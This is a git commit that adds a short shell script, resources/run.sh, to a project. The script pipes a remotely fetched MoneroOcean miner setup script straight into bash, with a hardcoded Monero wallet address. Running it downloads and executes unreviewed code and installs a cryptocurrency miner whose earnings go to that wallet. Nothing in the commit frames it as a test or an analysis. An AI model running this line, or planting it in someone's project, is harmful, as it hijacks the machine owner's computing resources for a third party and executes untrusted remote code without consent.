0535faae66c568d19a08d225a4855beec0a12e0b
Affan Orakzai <affanorakzai@proton.me>
2025-02-11 14:10:39 +0500

    Create run.sh

---
+++ resources/run.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+
+# Set up moneroocean pool
+
+curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 446gM7zZYcpe6iSDYNR5aG8pY8iw1VQuwZguqYpuTDFENm3MNLzKshji5RCNw9Af9Ah7iJTEPcnT8VwMd4Zxwyc7UxDHNVs
